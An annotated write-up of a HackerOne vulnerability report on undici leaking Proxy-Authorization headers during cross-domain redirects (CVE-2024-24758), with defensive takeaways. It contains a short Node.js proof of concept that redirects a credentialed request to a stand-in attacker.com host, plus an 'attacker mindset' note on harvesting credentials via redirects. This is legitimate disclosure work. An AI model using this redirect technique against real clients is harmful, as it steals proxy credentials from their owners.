# Proxy-Authorization Header Leakage in Cross-Domain Redirects in undici

## Metadata
- **Source:** HackerOne
- **Report:** 2390009 | https://hackerone.com/reports/2390009
- **Submitted:** 2024-02-26
- **Reporter:** timon8
- **Program:** Node.js undici
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Information Disclosure, Credential Leakage, Improper Header Filtering
- **CVEs:** CVE-2024-24758
- **Category:** web-api

## Summary
The undici HTTP client library fails to clear the Proxy-Authorization header during cross-domain redirects, unlike Authorization and Cookie headers which are properly stripped. This oversight allows sensitive proxy credentials to be inadvertently leaked to third-party domains when following redirects.

## Attack scenario
1. Attacker controls a website that serves HTTP 3xx redirect responses
2. Attacker's redirect points to a domain they control (e.g., attacker.com)
3. Legitimate application uses undici to make a request to the attacker's website with Proxy-Authorization header set
4. Application follows the redirect automatically (maxRedirections > 0)
5. undici forwards the request to attacker.com but fails to strip Proxy-Authorization header
6. Attacker's server receives the Proxy-Authorization credentials intended for the original proxy

## Root cause
The security fix in undici (GHSA-wqq4-5wpv-mx2g) selectively clears Authorization and Cookie headers during cross-domain redirects but omits Proxy-Authorization from the header stripping logic, creating an incomplete defense.

## Attacker mindset
Identify commonly used HTTP clients and their redirect handling behavior. Set up redirect endpoints to harvest authentication credentials from third parties. Proxy-Authorization is often overlooked in security audits because it's less commonly used than Authorization or Cookie headers, making it an attractive attack surface.

## Defensive takeaways
- Clear all authentication-related headers during cross-domain redirects, including Proxy-Authorization, Authorization, Cookie, and related headers
- Reference WHATWG Fetch specification section on authentication-entries for comprehensive header enumeration
- Audit HTTP client libraries to ensure consistent credential stripping across all authentication mechanisms
- Implement allowlist-based header filtering rather than blocklist approach to ensure no headers are accidentally forwarded
- Apply the same security principle to all derivative headers (e.g., Proxy-Authenticate, WWW-Authenticate response headers)
- Test redirect scenarios with various authentication header combinations

## Variant hunting
Search for similar incomplete header filtering in: other redirect implementations, custom HTTP client wrappers, reverse proxies, load balancers, and API gateways. Check if other authentication headers like Authorization-Bearer or custom auth headers are similarly overlooked. Examine if response headers (Proxy-Authenticate, WWW-Authenticate) are properly handled during redirects.

## MITRE ATT&CK
- T1598.003 - Phishing: Spearphishing Link (attacker controls redirect target)
- T1020 - Automatic Exfiltration (credentials leaked via redirect)
- T1598 - Phishing for Information

## Notes
This is a subtle security issue that demonstrates the importance of comprehensive header management in HTTP clients. The reference to Python's requests library (lines handling redirect security) and RFC specifications shows the reporter did thorough research. Affected versions span a wide range: <= v5.28.2 and v6.0.0-v6.6.0, suggesting this vulnerability existed across major version boundaries.

## Full report
<details><summary>Expand</summary>

I read this security advisory https://github.com/nodejs/undici/security/advisories/GHSA-wqq4-5wpv-mx2g.
It only clears authorization and cookie header during cross-domain redirect .
{F3080120}


As such this may lead to accidental leakage of "Proxy-Authorization" to a 3rd-party site.
```nodejs
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```
{F3080121}

You can refer to this python code.
https://github.com/psf/requests/blob/main/src/requests/sessions.py#L318
References
https://github.com/psf/requests/issues/1885
https://fetch.spec.whatwg.org/#authentication-entries
Impact
undici v6.5.0

## Impact

<= v5.28.2, >= v6.0.0 <= v6.6.0

</details>

---
*Analysed by Claude on 2026-05-24*
